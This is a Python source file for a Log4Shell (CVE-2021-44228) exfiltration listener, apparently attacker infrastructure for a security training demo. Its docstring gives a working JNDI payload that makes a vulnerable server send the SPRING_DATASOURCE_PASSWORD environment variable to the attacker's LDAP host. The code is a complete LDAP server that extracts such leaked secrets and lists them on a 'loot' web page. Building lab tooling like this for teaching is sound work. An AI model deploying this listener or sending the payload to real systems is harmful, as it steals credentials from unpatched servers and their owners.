#!/usr/bin/env python3
"""
EvilDog Callback Server — Log4Shell (CVE-2021-44228) data-exfiltration listener.

DogBank lab ONLY. This is the "attacker infrastructure" for the EBC masterclass.

What it does
------------
When the vulnerable auth-service logs a JNDI payload such as:

    ${jndi:ldap://evildog-callback:1389/cn=${env:SPRING_DATASOURCE_PASSWORD}}

Log4j 2.14.1 resolves the nested ${env:...} lookup *inline* and then opens a real
LDAP connection to this server. JNDI sends a bindRequest followed by a
searchRequest whose baseObject (DN) contains the exfiltrated secret. This server:

  1. Accepts the TCP/LDAP connection (proving the callback is real, not mocked).
  2. Parses the LDAP bind/search and extracts the DN → reveals the leaked value.
  3. Prints a loud [EXFIL] line to stdout so `docker logs` / `kubectl logs` show it
     live on screen, and the attacker terminal (evildog) can grep it.
  4. Serves a tiny HTTP status page (:8000) listing every callback received —
     a clean visual to project during the demo.

Why exfil-via-DN and not remote class loading?
----------------------------------------------
Modern JDKs (>= 8u191 / 11.0.1) block JNDI remote codebase loading by default
(com.sun.jndi.ldap.object.trustURLCodebase=false), so classic RCE via class
download usually fails. But the LDAP *connection still happens*, and the secret
travels in the request — so data exfiltration is reliable and 100% real. That is
the un-fakeable moment for the audience: a secret env var appears on the
attacker's server.

No third-party dependencies — pure Python stdlib, so the image is tiny.
"""

import asyncio
import os
import socket
import sys
from collections import deque
from datetime import datetime, timezone

LDAP_PORT = int(os.environ.get("LDAP_PORT", "1389"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "8000"))
MAX_HITS = int(os.environ.get("MAX_HITS", "500"))

# Ring buffer of received callbacks (for the HTTP status page).
HITS = deque(maxlen=MAX_HITS)


# --------------------------------------------------------------------------- #
# Pretty logging (stdout is what shows up in docker/kubectl logs)             #
# --------------------------------------------------------------------------- #
def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(msg: str) -> None:
    print(f"{_ts()}  {msg}", flush=True)


def banner() -> None:
    print("=" * 68, flush=True)
    print("  EvilDog Callback Server — Log4Shell exfiltration listener", flush=True)
    print(f"  LDAP  : 0.0.0.0:{LDAP_PORT}   (JNDI callback target)", flush=True)
    print(f"  HTTP  : 0.0.0.0:{HTTP_PORT}   (status page / evidence)", flush=True)
    print("  Lab use only — DogBank EBC masterclass", flush=True)
    print("=" * 68, flush=True)


# --------------------------------------------------------------------------- #
# Minimal BER/DER helpers (just enough LDAP to read a DN and reply "success") #
# --------------------------------------------------------------------------- #
def read_ber_len(data: bytes, idx: int):
    """Return (length, next_index) for a BER length starting at data[idx]."""
    first = data[idx]
    idx += 1
    if first < 0x80:  # short form
        return first, idx
    num = first & 0x7F  # long form: number of following length octets
    length = 0
    for _ in range(num):
        length = (length << 8) | data[idx]
        idx += 1
    return length, idx


def read_tlv(data: bytes, idx: int):
    """Return (tag, value_bytes, next_index) for a TLV starting at data[idx]."""
    tag = data[idx]
    length, idx = read_ber_len(data, idx + 1)
    value = data[idx:idx + length]
    return tag, value, idx + length


def encode_len(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    out = b""
    while length:
        out = bytes([length & 0xFF]) + out
        length >>= 8
    return bytes([0x80 | len(out)]) + out


def encode_int(value: int) -> bytes:
    """Encode an INTEGER (used to echo the LDAP messageID)."""
    if value == 0:
        body = b"\x00"
    else:
        body = b""
        v = value
        while v:
            body = bytes([v & 0xFF]) + body
            v >>= 8
        if body[0] & 0x80:  # keep it positive
            body = b"\x00" + body
    return b"\x02" + encode_len(len(body)) + body


def ldap_result(app_tag: int) -> bytes:
    """A generic LDAPResult with resultCode=success (0), empty matchedDN/message."""
    body = b"\x0a\x01\x00" + b"\x04\x00" + b"\x04\x00"  # ENUM 0, OCTET "", OCTET ""
    return bytes([app_tag]) + encode_len(len(body)) + body


def wrap_message(message_id: int, protocol_op: bytes) -> bytes:
    body = encode_int(message_id) + protocol_op
    return b"\x30" + encode_len(len(body)) + body


def printable_strings(data: bytes, minlen: int = 3):
    """Fallback: pull readable ASCII runs out of a raw PDU."""
    out, cur = [], []
    for b in data:
        if 0x20 <= b < 0x7F:
            cur.append(chr(b))
        else:
            if len(cur) >= minlen:
                out.append("".join(cur))
            cur = []
    if len(cur) >= minlen:
        out.append("".join(cur))
    return out


# --------------------------------------------------------------------------- #
# LDAP connection handler                                                     #
# --------------------------------------------------------------------------- #
async def read_pdu(reader: asyncio.StreamReader):
    """Read one full LDAP PDU (SEQUENCE) honoring TCP fragmentation."""
    first = await reader.readexactly(1)
    if first != b"\x30":
        # Not an LDAP SEQUENCE — read whatever is buffered and return it raw.
        rest = await reader.read(4096)
        return first + rest
    len_first = await reader.readexactly(1)
    if len_first[0] < 0x80:
        remaining = len_first[0]
        header = first + len_first
    else:
        num = len_first[0] & 0x7F
        len_bytes = await reader.readexactly(num)
        remaining = int.from_bytes(len_bytes, "big")
        header = first + len_first + len_bytes
    body = await reader.readexactly(remaining)
    return header + body


def parse_pdu(pdu: bytes):
    """Return (message_id, op_tag, dn_or_none). Best-effort, never raises."""
    try:
        _, seq_body, _ = read_tlv(pdu, 0)          # outer SEQUENCE
        _, mid_val, idx = read_tlv(seq_body, 0)    # messageID INTEGER
        message_id = int.from_bytes(mid_val, "big") if mid_val else 0
        op_tag, op_val, _ = read_tlv(seq_body, idx)  # protocolOp
        dn = None
        if op_tag == 0x63:  # searchRequest → first field is baseObject (LDAPDN)
            _, dn_val, _ = read_tlv(op_val, 0)
            dn = dn_val.decode("utf-8", "replace")
        elif op_tag == 0x60:  # bindRequest → version INT, name LDAPDN
            _, _, i2 = read_tlv(op_val, 0)
            _, name_val, _ = read_tlv(op_val, i2)
            dn = name_val.decode("utf-8", "replace") or None
        return message_id, op_tag, dn
    except Exception:
        return 0, None, None


def extract_secret(dn: str, pdu: bytes) -> str:
    """Get the leaked value from the DN (strip a leading cn=/ou= if present)."""
    candidate = dn or ""
    if not candidate:
        strings = printable_strings(pdu)
        candidate = max(strings, key=len) if strings else ""
    for prefix in ("cn=", "CN=", "ou=", "OU=", "dc=", "uid="):
        if candidate.startswith(prefix):
            candidate = candidate[len(prefix):]
            break
    return candidate.strip().strip(",")


async def handle_ldap(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    peer = writer.get_extra_info("peername")
    peer_ip = peer[0] if peer else "?"
    log(f"[CALLBACK] LDAP connection from {peer_ip} — target reached attacker infra")
    try:
        while True:
            try:
                pdu = await asyncio.wait_for(read_pdu(reader), timeout=10)
            except (asyncio.IncompleteReadError, asyncio.TimeoutError):
                break
            if not pdu:
                break
            message_id, op_tag, dn = parse_pdu(pdu)

            if op_tag == 0x60:  # bindRequest → reply success so client proceeds
                writer.write(wrap_message(message_id, ldap_result(0x61)))
                await writer.drain()
                log(f"[CALLBACK] bind from {peer_ip} (msgID={message_id})")

            elif op_tag == 0x63:  # searchRequest → the DN carries the secret
                secret = extract_secret(dn, pdu)
                hit = {
                    "ts": _ts(),
                    "src": peer_ip,
                    "dn": dn or "",
                    "secret": secret,
                }
                HITS.appendleft(hit)
                print("", flush=True)
                print("  " + "#" * 62, flush=True)
                log(f"[EXFIL] 🔓 SECRET LEAKED VIA LOG4SHELL  src={peer_ip}")
                log(f"[EXFIL] 🔓 DN      = {dn}")
                log(f"[EXFIL] 🔓 VALUE   = {secret}")
                print("  " + "#" * 62, flush=True)
                print("", flush=True)
                # SearchResultDone success (empty result set is fine for exfil).
                writer.write(wrap_message(message_id, ldap_result(0x65)))
                await writer.drain()

            elif op_tag == 0x42:  # unbindRequest
                break
            else:
                # Unknown op — record printable strings for evidence and move on.
                strings = printable_strings(pdu)
                if strings:
                    log(f"[CALLBACK] op=0x{op_tag:02x} from {peer_ip} data={strings}")
    except Exception as exc:  # never let one connection kill the server
        log(f"[CALLBACK] handler error from {peer_ip}: {exc!r}")
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


# --------------------------------------------------------------------------- #
# Tiny HTTP status page                                                       #
# --------------------------------------------------------------------------- #
def _html() -> str:
    rows = "".join(
        f"<tr><td>{h['ts']}</td><td>{h['src']}</td>"
        f"<td><code>{h['dn']}</code></td>"
        f"<td class='s'>{h['secret']}</td></tr>"
        for h in list(HITS)
    ) or "<tr><td colspan='4' class='empty'>No callbacks yet — fire the payload.</td></tr>"
    return f"""<!doctype html><html><head><meta charset=utf-8>
<meta http-equiv=refresh content=3>
<title>EvilDog Callback — Log4Shell loot</title>
<style>
 body{{font-family:ui-monospace,Menlo,monospace;background:#0b0f14;color:#e6edf3;margin:0;padding:24px}}
 h1{{color:#ff5c5c;font-size:18px}} .sub{{color:#7d8590;font-size:12px;margin-bottom:16px}}
 table{{width:100%;border-collapse:collapse;font-size:13px}}
 th,td{{text-align:left;padding:8px 10px;border-bottom:1px solid #21262d;vertical-align:top}}
 th{{color:#7d8590;text-transform:uppercase;font-size:11px;letter-spacing:.05em}}
 code{{color:#79c0ff}} .s{{color:#ff7b72;font-weight:700}}
 .empty{{color:#7d8590;text-align:center;padding:24px}}
 .count{{color:#3fb950}}
</style></head><body>
<h1>🐕‍🦺 EvilDog Callback Server — Log4Shell loot</h1>
<div class=sub>CVE-2021-44228 exfiltration listener · <span class=count>{len(HITS)} callback(s)</span> · auto-refresh 3s · lab only</div>
<table><thead><tr><th>Time (UTC)</th><th>Source IP</th><th>JNDI DN</th><th>Leaked value</th></tr></thead>
<tbody>{rows}</tbody></table>
</body></html>"""


async def handle_http(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        await asyncio.wait_for(reader.readline(), timeout=5)  # request line
        while True:  # drain headers
            line = await asyncio.wait_for(reader.readline(), timeout=5)
            if line in (b"\r\n", b"", b"\n"):
                break
        body = _html().encode()
        writer.write(
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: text/html; charset=utf-8\r\n"
            b"Connection: close\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
        )
        await writer.drain()
    except Exception:
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


# --------------------------------------------------------------------------- #
async def main() -> None:
    banner()
    ldap_srv = await asyncio.start_server(handle_ldap, "0.0.0.0", LDAP_PORT)
    http_srv = await asyncio.start_server(handle_http, "0.0.0.0", HTTP_PORT)
    log("listeners up — waiting for the target to call home")
    async with ldap_srv, http_srv:
        await asyncio.gather(ldap_srv.serve_forever(), http_srv.serve_forever())


if __name__ == "__main__":
    # Make stdout line-buffered so logs appear immediately in docker/kubectl.
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
